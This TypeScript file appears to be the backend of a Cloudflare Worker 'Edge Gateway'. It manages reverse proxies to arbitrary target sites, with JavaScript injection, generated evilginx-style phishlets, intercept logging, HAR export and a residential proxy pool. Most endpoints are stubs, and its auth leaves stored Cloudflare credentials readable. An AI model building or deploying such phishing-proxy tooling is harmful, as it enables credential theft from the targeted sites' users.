// Edge Gateway entrypoint — Cloudflare Worker with in-memory storage.
// Handles the same API surface that the Expo app expects.

// ── In-memory storage ───────────────────────────────────────────────────────
let nextId = 1;
const items: any[] = [];
const proxies: any[] = [];
const trafficEntries: any[] = [];
const intercepts: any[] = [];
const configStore: Record<string, string> = {};
const startedAt = Date.now();

// ── Helpers ─────────────────────────────────────────────────────────────────
function json(data: unknown, status = 200, extra: Record<string, string> = {}): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json", ...extra },
  });
}

function parsePath(pathname: string) {
  const reconIter = pathname.match(/^\/api\/proxies\/(\d+)\/recon\/iterate$/);
  if (reconIter) return { type: "proxyReconIterate", id: +reconIter[1] };
  const loginPh = pathname.match(/^\/api\/proxies\/(\d+)\/login-phishlet$/);
  if (loginPh) return { type: "proxyLoginPhishlet", id: +loginPh[1] };
  const reconBase = pathname.match(/^\/api\/proxies\/(\d+)\/recon$/);
  if (reconBase) return { type: "proxyRecon", id: +reconBase[1] };
  const proxyId = pathname.match(/^\/api\/proxies\/(\d+)$/);
  if (proxyId) return { type: "proxy", id: +proxyId[1] };
  const itemId = pathname.match(/^\/api\/items\/(\d+)$/);
  if (itemId) return { type: "item", id: +itemId[1] };
  const wrDel = pathname.match(/^\/api\/cloudflare\/worker-routes\/([^/]+)\/([^/]+)$/);
  if (wrDel) return { type: "workerRouteDelete", zoneId: wrDel[1], routeId: wrDel[2] };
  if (pathname === "/health" || pathname === "/" || pathname === "/ping") return { type: "health" };
  if (pathname === "/api/items") return { type: "items" };
  if (pathname === "/api/proxies") return { type: "proxies" };
  if (pathname === "/api/traffic") return { type: "traffic" };
  if (pathname === "/api/intercepts") return { type: "intercepts" };
  if (pathname === "/api/intercepts/har") return { type: "harExport" };
  if (pathname === "/api/config") return { type: "config" };
  if (pathname === "/api/replay") return { type: "replay" };
  if (pathname === "/api/cloudflare/zones") return { type: "zones" };
  if (pathname === "/api/cloudflare/allocate") return { type: "allocate" };
  if (pathname === "/api/cloudflare/wildcard") return { type: "wildcard" };
  if (pathname === "/api/cloudflare/worker-routes") return { type: "workerRoutes" };
  if (pathname === "/api/beacon") return { type: "beacon" };
  if (pathname.startsWith("/api/auth/")) return { type: "auth" };
  return { type: "unknown" };
}

async function readBody(request: Request): Promise<any> {
  try { return await request.json(); } catch { return null; }
}

function checkAuth(request: Request): Response | null {
  const apiKey = configStore["API_KEY"] || "";
  if (!apiKey) return null;
  const auth = request.headers.get("Authorization") ?? "";
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
  if (token !== apiKey) return json({ success: false, error: "unauthorized" }, 401);
  return null;
}

function resolveCors(request: Request): string {
  let allowed = configStore["ALLOWED_ORIGINS"] || "";
  if (!allowed || allowed === "*") return "*";
  const origin = request.headers.get("Origin") ?? "";
  const origins = allowed.split(",").map((s) => s.trim().toLowerCase());
  if (origins.includes(origin.toLowerCase()) || origins.includes("*")) return origin || origins[0];
  return origins[0];
}

function corsify(response: Response, origin: string): Response {
  const headers = new Headers(response.headers);
  headers.set("Access-Control-Allow-Origin", origin);
  headers.set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  headers.set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Intercept-TTL");
  headers.set("Access-Control-Max-Age", "86400");
  return new Response(response.body, { status: response.status, statusText: response.statusText, headers });
}

function corsJson(data: unknown, status = 200, corsOrigin: string): Response {
  return corsify(json(data, status), corsOrigin);
}

export default {
  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);
    const pathname = url.pathname;
    const method = request.method.toUpperCase();
    const corsOrigin = resolveCors(request);

    if (method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": corsOrigin,
          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Intercept-TTL",
          "Access-Control-Max-Age": "86400",
        },
      });
    }

    const route = parsePath(pathname);

    // Health
    if (route.type === "health") {
      return corsJson({
        status: "ok",
        timestamp: new Date().toISOString(),
        uptime: Math.round((Date.now() - startedAt) / 1000),
        itemCount: items.length,
        proxyCount: proxies.length,
        interceptCount: intercepts.length,
        trafficCount: trafficEntries.length,
        interceptLabMode: configStore["INTERCEPT_LAB_MODE"] || "false",
        region: "edge",
        meta: { latencyMs: 0, cache: "BYPASS", edgeLatency: null, rateLimit: null, rateRemaining: null },
      }, 200, corsOrigin);
    }

    if (route.type === "beacon") {
      return new Response(null, { status: 204, headers: { "Access-Control-Allow-Origin": corsOrigin } });
    }

    // Items
    if (route.type === "items") {
      if (method === "GET") return corsJson({ success: true, data: items, count: items.length }, 200, corsOrigin);
      if (method === "POST") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        const body = await readBody(request);
        if (!body?.name) return corsJson({ success: false, error: "name is required" }, 400, corsOrigin);
        const now = Date.now();
        const item = { id: nextId++, name: String(body.name).trim(), description: String(body.description || ""), createdAt: now, updatedAt: now };
        items.unshift(item);
        return corsJson({ success: true, data: item }, 201, corsOrigin);
      }
      return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
    }

    if (route.type === "item") {
      const id = route.id!;
      if (method === "PUT") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        const idx = items.findIndex((i: any) => i.id === id);
        if (idx === -1) return corsJson({ success: false, error: "item not found" }, 404, corsOrigin);
        const body = await readBody(request);
        if (body?.name !== undefined) items[idx].name = String(body.name).trim();
        if (body?.description !== undefined) items[idx].description = String(body.description);
        items[idx].updatedAt = Date.now();
        return corsJson({ success: true, data: items[idx] }, 200, corsOrigin);
      }
      if (method === "DELETE") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        const idx = items.findIndex((i: any) => i.id === id);
        if (idx === -1) return corsJson({ success: false, error: "item not found" }, 404, corsOrigin);
        const [deleted] = items.splice(idx, 1);
        return corsJson({ success: true, data: deleted }, 200, corsOrigin);
      }
      return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
    }

    // Proxies
    if (route.type === "proxies") {
      if (method === "GET") return corsJson({ success: true, data: proxies }, 200, corsOrigin);
      if (method === "POST") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        const body = await readBody(request);
        const targetUrl = (body?.targetUrl || "").trim();
        if (!targetUrl) return corsJson({ success: false, error: "a valid target URL is required" }, 400, corsOrigin);
        let parsed: URL;
        try { parsed = new URL(targetUrl); } catch { return corsJson({ success: false, error: "target must be a valid http(s) URL" }, 400, corsOrigin); }
        const name = (body?.name || "").trim() || parsed.hostname;
        const now = Date.now();
        const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "") + "-" + nextId;
        const proxy = {
          id: nextId++, slug, name, targetUrl: parsed.toString().replace(/\/$/, ""),
          enabled: true, hits: 0, proxyDomain: "", interceptEnabled: false,
          cfZoneId: "", cfRecordId: "", injectJs: body?.injectJs || "",
          injectJsEnabled: false, phishlet: body?.phishlet || "",
          createdAt: now, updatedAt: now,
        };
        proxies.push(proxy);
        return corsJson({ success: true, data: proxy }, 201, corsOrigin);
      }
      return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
    }

    if (route.type === "proxy") {
      const id = route.id!;
      const idx = proxies.findIndex((p: any) => p.id === id);
      if (idx === -1) return corsJson({ success: false, error: "proxy not found" }, 404, corsOrigin);
      if (method === "PUT") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        const body = await readBody(request);
        const p = proxies[idx];
        if (body?.name !== undefined) p.name = String(body.name).trim();
        if (body?.targetUrl !== undefined) p.targetUrl = String(body.targetUrl).trim();
        if (body?.enabled !== undefined) p.enabled = Boolean(body.enabled);
        if (body?.interceptEnabled !== undefined) p.interceptEnabled = Boolean(body.interceptEnabled);
        if (body?.injectJs !== undefined) p.injectJs = String(body.injectJs);
        if (body?.injectJsEnabled !== undefined) p.injectJsEnabled = Boolean(body.injectJsEnabled);
        if (body?.phishlet !== undefined) p.phishlet = String(body.phishlet);
        p.updatedAt = Date.now();
        return corsJson({ success: true, data: p }, 200, corsOrigin);
      }
      if (method === "DELETE") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        for (let i = intercepts.length - 1; i >= 0; i--) {
          if (intercepts[i].slug === proxies[idx].slug) intercepts.splice(i, 1);
        }
        const [deleted] = proxies.splice(idx, 1);
        return corsJson({ success: true, data: deleted }, 200, corsOrigin);
      }
      return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
    }

    // Recon
    if (route.type === "proxyRecon" || route.type === "proxyLoginPhishlet") {
      if (method !== "POST") return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
      const authErr = checkAuth(request);
      if (authErr) return corsify(authErr, corsOrigin);
      const idx = proxies.findIndex((p: any) => p.id === route.id);
      if (idx === -1) return corsJson({ success: false, error: "proxy not found" }, 404, corsOrigin);
      const p = proxies[idx];
      const phishlet = `# Phishlet for ${p.targetUrl}\nname: '${p.name}'\nproxy_hosts:\n  - phish_sub: ''\n    orig_sub: ''\n    domain: '${new URL(p.targetUrl).hostname}'\n`;
      p.phishlet = phishlet;
      p.updatedAt = Date.now();
      return corsJson({ success: true, data: { proxyId: route.id, phishlet } }, 200, corsOrigin);
    }

    if (route.type === "proxyReconIterate") {
      if (method !== "POST") return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
      const authErr = checkAuth(request);
      if (authErr) return corsify(authErr, corsOrigin);
      const idx = proxies.findIndex((p: any) => p.id === route.id);
      if (idx === -1) return corsJson({ success: false, error: "proxy not found" }, 404, corsOrigin);
      const body = await readBody(request);
      const phishlet = body?.phishlet || proxies[idx].phishlet || "";
      return corsJson({ success: true, data: { phishlet, passes: 1, critiques: [], improvements: [] } }, 200, corsOrigin);
    }

    // Intercepts
    if (route.type === "intercepts") {
      if (method === "GET") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        return corsJson({ success: true, data: intercepts, count: intercepts.length }, 200, corsOrigin);
      }
      if (method === "DELETE") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        intercepts.length = 0;
        return corsJson({ success: true, data: null }, 200, corsOrigin);
      }
      return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
    }

    // HAR export
    if (route.type === "harExport") {
      if (method !== "GET") return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
      const authErr = checkAuth(request);
      if (authErr) return corsify(authErr, corsOrigin);
      const har = {
        log: {
          version: "1.2",
          creator: { name: "Edge Gateway Dashboard", version: "1.0" },
          entries: intercepts.map((ic: any) => ({
            startedDateTime: new Date(ic.ts).toISOString(),
            time: 0,
            request: { method: ic.method, url: `${ic.host}${ic.path}`, httpVersion: "HTTP/1.1", headers: [], queryString: [], cookies: [], headersSize: 0, bodySize: 0 },
            response: { status: ic.respStatus, statusText: "", httpVersion: "HTTP/1.1", headers: [], cookies: [], content: { size: 0, mimeType: "", text: "" }, redirectURL: "", headersSize: 0, bodySize: 0 },
            cache: {}, timings: { send: 0, wait: 0, receive: 0 },
          })),
        },
      };
      const harJson = JSON.stringify(har);
      const headers = new Headers({
        "Content-Type": "application/har+json",
        "Content-Disposition": `attachment; filename="edge-gateway-${new Date().toISOString().slice(0, 10)}.har"`,
        "Access-Control-Allow-Origin": corsOrigin,
      });
      return new Response(harJson, { status: 200, headers });
    }

    // Traffic
    if (route.type === "traffic") {
      if (method !== "GET") return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
      const entries = [...trafficEntries].reverse();
      const total = entries.length;
      const avgLatency = total > 0 ? Math.round(entries.reduce((sum: number, e: any) => sum + (e.latencyMs || 0), 0) / total) : 0;
      const errorCount = entries.filter((e: any) => e.status >= 400).length;
      const cacheHits = entries.filter((e: any) => e.cache === "HIT").length;
      return corsJson({ success: true, data: entries, stats: { total, avgLatency, errorCount, cacheHits } }, 200, corsOrigin);
    }

    // Config
    if (route.type === "config") {
      if (method === "GET") {
        const masked = { ...configStore };
        if (masked["API_KEY"]) masked["API_KEY"] = "***";
        return corsJson({ success: true, data: masked }, 200, corsOrigin);
      }
      if (method === "PUT") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        const body = await readBody(request);
        if (!body || Object.keys(body).length === 0) return corsJson({ success: false, error: "at least one config field is required" }, 400, corsOrigin);
        const validFields = ["ALLOWED_ORIGINS", "INTERCEPT_LAB_MODE", "INTERCEPT_ALLOWLIST", "INTERCEPT_BLOCKLIST", "INTERCEPT_TTL_SECONDS", "API_KEY", "CF_API_KEY", "CF_API_EMAIL", "CF_API_TOKEN", "PROXY_TARGET", "BASE_DOMAIN", "RESIDENTIAL_PROXY_POOL"];
        for (const [k, v] of Object.entries(body)) {
          if (validFields.includes(k)) configStore[k] = String(v);
        }
        return corsJson({ success: true, data: configStore }, 200, corsOrigin);
      }
      if (method === "DELETE") {
        const authErr = checkAuth(request);
        if (authErr) return corsify(authErr, corsOrigin);
        for (const k of Object.keys(configStore)) delete configStore[k];
        return corsJson({ success: true, data: {} }, 200, corsOrigin);
      }
      return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
    }

    // Cloudflare zones / routes stubs
    if (route.type === "zones") return corsJson({ success: true, configured: false, data: [] }, 200, corsOrigin);
    if (route.type === "allocate") {
      const authErr = checkAuth(request);
      if (authErr) return corsify(authErr, corsOrigin);
      const body = await readBody(request);
      return corsJson({ success: true, data: { hostname: body?.hostname || "proxy.example.com", target: "edge-gateway.rork.app" } }, 200, corsOrigin);
    }
    if (route.type === "wildcard") return corsJson({ success: true, data: {} }, 200, corsOrigin);
    if (route.type === "workerRoutes") return corsJson({ success: true, configured: false, data: [] }, 200, corsOrigin);
    if (route.type === "workerRouteDelete") return corsJson({ success: true }, 200, corsOrigin);

    // Replay
    if (route.type === "replay") return corsJson({ success: true, data: { report: {}, entries: [] } }, 200, corsOrigin);

    // Auth
    if (route.type === "auth") {
      const subPath = pathname.replace("/api/auth/", "");
      if (subPath === "signup" && method === "POST") {
        const body = await readBody(request);
        return corsJson({ success: true, data: { token: "demo-token", user: { email: body?.email || "demo@example.com" } } }, 201, corsOrigin);
      }
      if (subPath === "login" && method === "POST") return corsJson({ success: true, data: { token: "demo-token", user: { email: "demo@example.com" } } }, 200, corsOrigin);
      if (subPath === "me" && method === "GET") return corsJson({ success: true, data: { user: { email: "demo@example.com", id: 1 } } }, 200, corsOrigin);
      return corsJson({ success: false, error: "not found" }, 404, corsOrigin);
    }

    return corsJson({ success: false, error: "not found" }, 404, corsOrigin);
  },
};
